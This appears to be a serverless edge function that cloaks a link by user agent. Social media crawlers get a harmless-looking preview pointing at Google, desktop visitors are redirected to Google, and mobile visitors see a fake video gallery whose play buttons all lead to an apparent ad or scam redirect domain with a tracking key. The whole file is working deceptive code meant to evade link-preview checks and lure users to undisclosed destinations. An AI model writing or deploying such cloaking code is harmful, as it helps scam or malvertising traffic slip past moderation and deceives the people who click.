export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get("user-agent") || "";

  // 1. Social media bots: Open Graph preview
  const isSocialBot =
    /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <meta property="og:title" content="HOPE-145">
  <meta property="og:description" content="">
  <meta property="og:image" content="https://www.google.com/share.google?q=mrvCthCHJpCuF14FV">
  <meta property="og:url" content="https://www.google.com/">
  <meta property="og:type" content="website">
</head>
<body></body>
</html>`;

    return new Response(html, {
      headers: {
        "content-type": "text/html;charset=UTF-8",
        "cache-control": "no-store"
      }
    });
  }

  // 2. Desktop: Google 302 redirect
  const isMobile =
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (!isMobile) {
    return Response.redirect("https://www.google.com/", 302);
  }

  // 3. Mobile and other mobile devices: Gallery
  const gallery = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gallery</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 20px;
      background: #111;
      font-family: Arial, sans-serif;
    }
    .gallery-container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 16px;
      max-width: 1100px;
      margin: 0 auto;
    }
    .video-card {
      display: block;
      position: relative;
      overflow: hidden;
      border-radius: 10px;
      background: #222;
    }
    .video-thumbnail {
      display: block;
      width: 100%;
      height: 220px;
      object-fit: cover;
    }
    .play-overlay {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,.12);
    }
    .play-button {
      width: 58px;
      height: 58px;
      border-radius: 50%;
      background: rgba(0,0,0,.65);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .play-icon {
      width: 0;
      height: 0;
      margin-left: 5px;
      border-top: 12px solid transparent;
      border-bottom: 12px solid transparent;
      border-left: 18px solid white;
    }
  </style>
</head>
<body>
  <div class="gallery-container">
    <a href="https://providetangerinetwitch.com/r28x35y8w?key=78e44b4cde187ab518358669131f9a2a " class="video-card">
      <img src="https://raw.githubusercontent.com/rehanqadirzr-alt/raha2/refs/heads/main/1.gif"
           alt="Video 1" class="video-thumbnail">
      <div class="play-overlay"><div class="play-button"><div class="play-icon"></div></div></div>
    </a>

    <a href="https://providetangerinetwitch.com/r28x35y8w?key=78e44b4cde187ab518358669131f9a2a" class="video-card">
      <img src="https://raw.githubusercontent.com/rehanqadirzr-alt/gifs/refs/heads/main/4.gif"
           alt="Video 2" class="video-thumbnail">
      <div class="play-overlay"><div class="play-button"><div class="play-icon"></div></div></div>
    </a>

    <a href="https://providetangerinetwitch.com/r28x35y8w?key=78e44b4cde187ab518358669131f9a2a" class="video-card">
      <img src="https://raw.githubusercontent.com/rehanqadirzr-alt/gifs/refs/heads/main/6.gif"
           alt="Video 3" class="video-thumbnail">
      <div class="play-overlay"><div class="play-button"><div class="play-icon"></div></div></div>
    </a>
  </div>
</body>
</html>`;

  return new Response(gallery, {
    headers: {
      "content-type": "text/html;charset=UTF-8",
      "cache-control": "no-store"
    }
  });
}
